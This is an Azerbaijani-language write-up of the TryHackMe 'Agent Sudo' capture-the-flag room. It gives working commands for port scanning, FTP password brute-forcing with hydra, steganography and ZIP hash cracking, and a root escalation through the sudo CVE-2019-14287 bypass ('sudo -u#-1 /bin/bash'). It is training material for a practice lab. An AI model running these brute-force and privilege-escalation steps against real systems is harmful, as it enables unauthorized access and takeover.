# TryHackMe — Agent Sudo Write-up

**Otaq:** [Agent Sudo](https://tryhackme.com/room/agentsudoctf)  
**Çətinlik:** Easy  
**Mövzular:** Enumeration, User-Agent, Steganography, Hash Cracking, Privilege Escalation  
**CVE:** CVE-2019-14287

> "Dərin dənizin altında gizli server tapıldı. Serverin içinə gir və həqiqəti aşkar et."

---

## Task 1 — Giriş

Tapşırığı oxuyun və maşını işə salın.

---

## Task 2 — Enumeration (Kəşfiyyat)

### Nmap ilə port taraması

```bash
nmap -sV -A -Pn HƏDƏF_IP
```

**Tapılan 3 açıq port:**

| Port | Servis |
|------|--------|
| 21   | FTP    |
| 22   | SSH    |
| 80   | HTTP   |

### Veb səhifəyə baxış

Brauzerdə `http://HƏDƏF_IP` açın. Səhifədə Agent R tərəfindən yazılmış mesaj görünür:

```
"Use your own codename as user-agent to access the site."
```

Bu ipucu deyir ki, **User-Agent**-i dəyişdirərək gizli səhifəyə daxil olmaq lazımdır.

### Agent adını tapmaq

25 agent var + Agent R = 26 → əlifbanın 26 hərfi! A-dan Z-yə qədər sınayın:

```bash
for i in {A..Z}; do
  echo "=== Agent $i ==="
  curl -s -A "$i" http://HƏDƏF_IP -L
  echo ""
done
```

**Agent C** ilə fərqli səhifə açılır:

```
http://HƏDƏF_IP/agent_C_attention.php
```

Orada agent adı məlum olur — **chris**.

---

## Task 3 — Hash Cracking və Brute-Force

### FTP Brute-Force (Hydra)

Agent C-nin adı ilə FTP-yə parol tapın:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://HƏDƏF_IP
```

Parol tapılır. FTP-yə qoşulun:

```bash
ftp HƏDƏF_IP
# Name: chris
# Password: [tapılan parol]
```

Faylları yükləyin:

```bash
ls
get cute-alien.jpg
get cutie.png
get To_agentJ.txt
bye
```

### cutie.png — Binwalk ilə analiz

```bash
binwalk cutie.png
```

İçərisində ZIP arxivi tapılır. Çıxarın:

```bash
binwalk -e --run-as=root cutie.png
cd _cutie.png.extracted/
```

ZIP parol qorunmasındadır — john ilə açın:

```bash
zip2john 8702.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
john zip.hash --show
```

Parol tapılır. 7zip ilə açın:

```bash
7z x 8702.zip
cat To_agentR.txt
```

İçərisindəki Base64 mətni decode edin:

```bash
echo "QXJlYTUx" | base64 -d
# Area51
```

Bu **steghide parolu**dur!

### cute-alien.jpg — Steghide ilə analiz

```bash
steghide extract -sf cute-alien.jpg -p Area51
cat mesaj.txt
```

İçərisindən SSH istifadəçi adı və parolu çıxır:
- **İstifadəçi:** james
- **Parol:** hackerrules!

---

## Task 4 — User Flag

SSH ilə daxil olun:

```bash
ssh james@HƏDƏF_IP
# Parol: hackerrules!
```

User flag-i oxuyun:

```bash
cat user_flag.txt
```

### Şəkil — Reverse Image Search

FTP-dən yüklənmiş şəkli öz maşınınıza göndərin:

```bash
# AttackBox-da:
scp james@HƏDƏF_IP:/home/james/Alien_autospy.jpg .
```

[images.google.com](https://images.google.com) saytında şəkli axtarın → **Roswell Alien Autopsy** hadisəsi.

---

## Task 5 — Privilege Escalation (Root)

### Sudo versiyasını yoxlayın

```bash
sudo --version
# Sudo version 1.8.21p2
```

Bu versiyanın **CVE-2019-14287** zəifliyi var!

### İcazələri yoxlayın

```bash
sudo -l
# Parol: hackerrules!
```

Nəticə:
```
(ALL, !root) /bin/bash
```

Bu o deməkdir: James root **xaricindəki** bütün istifadəçilər kimi `/bin/bash` işlədə bilər.

### CVE-2019-14287 — Exploit

```bash
sudo -u#-1 /bin/bash
```

**Niyə işləyir?**
- `-1` ID-si C dilində `unsigned int`-ə çevrildikdə `4294967295` olur
- Bu tapılmayanda sudo onu `0` (root) kimi qəbul edir
- Amma `!root` yoxlaması **ad üzərindən** işlədiyi üçün keçilir

```bash
id
# uid=0(root) — ROOT!
```

Root flag-i oxuyun:

```bash
cat /root/root.txt
```

---

## Öyrənilən Mövzular

| Mövzu | İstifadə edilən alət |
|-------|---------------------|
| Port taraması | nmap |
| Veb kəşfiyyat | curl (User-Agent) |
| Brute-force | hydra |
| Steganografiya | binwalk, steghide |
| Hash cracking | john, zip2john |
| OSINT | Google Reverse Image Search |
| Privilege Escalation | CVE-2019-14287 |

---

## Qısa Xülasə

```
nmap → 3 port (FTP, SSH, HTTP)
    ↓
User-Agent "C" → Agent C = chris
    ↓
Hydra FTP → parol tapıldı
    ↓
FTP → cute-alien.jpg + cutie.png
    ↓
binwalk → ZIP → john → Base64 → Area51
    ↓
steghide → james:hackerrules!
    ↓
SSH → user flag
    ↓
sudo -u#-1 /bin/bash → ROOT flag 🎯
```

---

*Flag-lər qəsdən yazılmamışdır. Özünüz tapın!*
